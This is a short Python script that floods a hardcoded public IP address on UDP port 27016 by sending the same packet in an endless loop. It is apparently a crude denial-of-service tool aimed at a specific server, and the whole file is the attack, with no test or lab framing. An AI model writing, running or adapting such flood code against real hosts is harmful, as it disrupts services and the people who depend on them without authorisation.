#    Include Librarys
import socket, os

#    Create Variables
packet = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#    Create Function: Send Packet
def send_packet(ip, port):
    
    #    Clear Screen
    os.system("clear")
    
    #    Print Text's
    print("Send packet script active")
    print("IP: {}".format(ip))
    print("PORT: {}".format(port))
        
    #    For with while
    while True:
        packet.sendto('64164', (ip, port))

#    Call Function
send_packet("46.174.48.156", 27016)
